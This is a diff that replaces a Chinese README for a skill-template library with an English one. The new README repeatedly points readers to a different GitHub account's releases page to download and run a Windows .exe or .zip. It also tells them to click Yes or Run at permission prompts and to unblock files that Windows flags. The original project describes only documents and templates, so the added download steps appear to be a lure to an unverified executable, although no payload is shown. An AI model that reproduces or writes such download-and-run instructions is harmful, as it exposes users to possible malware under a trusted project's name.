@@ -1,98 +1,161 @@
-# codex-skill-ai-agent-workflow - AI 工程工作流技能库 | AI Agent Workflow Skill
+# 🤖 codex-skill-ai-agent-workflow - Run AI Agent Workflows Fast
 
-项目聚焦技能化方法沉淀，通过标准化模板帮助团队复用工作流与最佳实践。
+[🟦⬜ Visit the releases page to download](https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases)
 
-## 目录
+## 📥 Download
 
-- [1. 项目概述](#1-项目概述)
-- [2. 目标与场景](#2-目标与场景)
-- [3. 核心能力](#3-核心能力)
-- [4. 技术栈](#4-技术栈)
-- [5. 仓库结构](#5-仓库结构)
-- [6. Quick Start](#6-quick-start)
-- [7. 配置建议](#7-配置建议)
-- [8. 开发与测试](#8-开发与测试)
-- [9. 协作与发布](#9-协作与发布)
-- [10. 路线图](#10-路线图)
-- [11. 贡献指南](#11-贡献指南)
-- [12. License](#12-license)
+Visit this page to download: https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases
 
-## 1. 项目概述
+On the releases page, look for the latest release near the top. Download the file that matches your Windows setup. If you see a `.zip` file, save it to your computer. If you see an `.exe` file, download that file instead.
 
-本仓库以工程化可维护为目标，强调文档清晰、结构稳定、可持续迭代。
+## 🪟 Run on Windows
 
-## 2. 目标与场景
+1. Open the folder where the file was saved.
+2. If the file is a `.zip`, right-click it and choose **Extract All**.
+3. Open the extracted folder.
+4. If the file is an `.exe`, double-click it to start the app.
+5. If Windows asks for permission, click **Yes** or **Run**.
+6. Follow the on-screen steps until the app opens.
 
-适用场景：
+If the app came in a folder with extra files, keep them together. The app may need them to start.
 
-- 作为业务功能开发与验证的基础仓库。
-- 作为团队内部协作与知识沉淀的载体。
-- 作为后续扩展和二次开发的起点。
+## 🧰 What This Tool Does
 
-## 3. 核心能力
+codex-skill-ai-agent-workflow helps you run repeatable AI agent tasks in a simple way. It is built for workflows that use prompts, tools, MCP connections, and evaluation loops.
 
-- 提供技能说明、示例与参考资料。
-- 支持按场景快速复用与团队协作。
-- 支持持续迭代与标准化沉淀。
+You can use it to:
 
-## 4. 技术栈
+- run the same AI task the same way each time
+- keep prompts in one place
+- connect tools your workflow needs
+- use MCP services for extra capabilities
+- check results with evaluation steps
+- repeat a workflow when you want better output
 
-- Skill Specification
+## ✅ What You Need
 
-## 5. 仓库结构
+This app is meant for a Windows computer.
 
-建议优先阅读：
+A good setup includes:
 
-- README.md：项目入口与整体说明。
-- docs 或同类目录：架构、规范、部署与 FAQ。
-- 核心源码目录：按模块深入阅读。
+- Windows 10 or Windows 11
+- an internet connection for the first download
+- enough free space for the app files
+- permission to open downloaded files
+- a modern browser to reach the releases page
 
-## 6. Quick Start
+If Windows shows a security prompt, choose the option that lets you open the file only if you trust the download source.
 
-1. 克隆仓库并进入目录：
+## 🗂️ Files You May See
 
-    git clone https://github.com/however-yir/codex-skill-ai-agent-workflow.git
-    cd codex-skill-ai-agent-workflow
+After you download and unpack the release, you may see:
 
-2. 安装依赖并启动（按项目类型选择）：
+- the main app file
+- a readme file
+- config files
+- sample prompt files
+- folders for tools or workflow data
+- logs from past runs
 
-请按仓库现有脚本执行安装与启动步骤。
+Keep the full folder in one place so the app can find what it needs.
 
-3. 最小验证建议：
+## 🧭 First-Time Setup
 
-- 依赖安装成功。
-- 核心流程可运行。
-- 基础测试或检查通过。
+1. Download the latest release from the releases page.
+2. Save the file to a simple location such as your **Downloads** folder.
+3. If the download is a zip file, extract it.
+4. Open the app file or folder.
+5. If the app asks for settings, use the default options first.
+6. Add your prompts, tools, or MCP links if the app asks for them.
+7. Run a test workflow to confirm everything works.
 
-## 7. 配置建议
+If the app includes a settings file, open it with Notepad and check the names of the fields before changing values.
 
-建议按 dev / staging / prod 分层配置，并将密钥类信息放入环境变量或密钥管理系统。
+## 🔌 Prompts, Tools, and MCP
 
-## 8. 开发与测试
+This app is built around AI workflows that can repeat the same steps with less manual work.
 
-推荐流程：
+### Prompts
+Prompts tell the AI what to do. You can keep them short and clear. Good prompts help the workflow stay focused.
 
-1. 基于默认分支创建功能分支。
-2. 小步提交并保持提交目标单一。
-3. 本地完成构建与测试后再推送。
-4. 通过 Pull Request 完成评审与合并。
+### Tools
+Tools let the workflow do extra work, such as reading files, checking data, or moving between steps. Some tools may be built in. Others may need setup.
 
-## 9. 协作与发布
+### MCP
+MCP stands for Model Context Protocol. It helps the app connect to outside services in a standard way. If your release includes MCP support, you can link the app to compatible services and use them inside a workflow.
 
-建议使用语义化版本，发布说明应包含新增、修复与兼容性说明。
+### Evaluation loops
+Evaluation loops check the output and help you improve it. The app can run the task, review the result, and try again if needed. This is useful when you want steady results.
 
-## 10. 路线图
+## 🧪 Basic Workflow Example
 
-建议按以下顺序推进：
+A simple workflow may look like this:
 
-1. 稳定主流程与关键接口。
-2. 优化模块边界与可观测性。
-3. 完善自动化测试与文档体系。
+1. Start the app.
+2. Load a prompt.
+3. Choose a tool or MCP source.
+4. Run the workflow.
+5. Review the result.
+6. Make a small change if the result is off.
+7. Run it again.
 
-## 11. 贡献指南
+This gives you a clear way to repeat work without starting over each time.
 
-提交建议包含：变更背景、实现说明、验证结果、风险评估。
+## 🛠️ Common Tasks
 
-## 12. License
+### Change a prompt
+Open the prompt file, update the text, and save it. Then run the workflow again.
 
-请以仓库内现有 License 文件为准。
+### Add a tool
+Place the tool file in the folder the app uses, or connect it in the settings if the app uses a list of tools.
+
+### Use a new MCP connection
+Open the config area, enter the connection details, and save the changes. Then test the connection before you run a full workflow.
+
+### Review output
+Check the result against your goal. If it misses the mark, edit the prompt or add an evaluation step.
+
+## 🔍 Troubleshooting
+
+### The file does not open
+- Make sure you downloaded the full release file
+- Check that you extracted the zip file if the download was compressed
+- Try opening the app again from the extracted folder
+
+### Windows blocks the file
+- Right-click the file and check its properties
+- If Windows says the file came from another computer, allow it only if you trust the source
+
+### The app closes right away
+- Open the folder and look for a log file
+- Run the app again from the same folder
+- Make sure all files from the release stayed together
+
+### A prompt or tool does not load
+- Confirm the file name is correct
+- Check that the file is in the right folder
+- Open the config file and compare it with the sample file, if one is included
+
+### MCP connection fails
+- Check the service address
+- Confirm your internet connection
+- Make sure the service supports MCP
+- Try the connection again after saving the settings
+
+## 📌 Tips for Better Results
+
+- Use short prompts
+- Keep one task per workflow
+- Test one change at a time
+- Save working configs before editing them
+- Use clear file names
+- Review outputs before you trust them
+- Keep tools in one folder
+
+## 📦 Release Page
+
+Download the latest Windows release here: https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases
+
+## 🧩 Repository Topics
+
+agent-skill, agent-workflow, ai-agents, codex, codex-skill, evaluation, llmops, mcp, prompt-engineering, workflow-automation
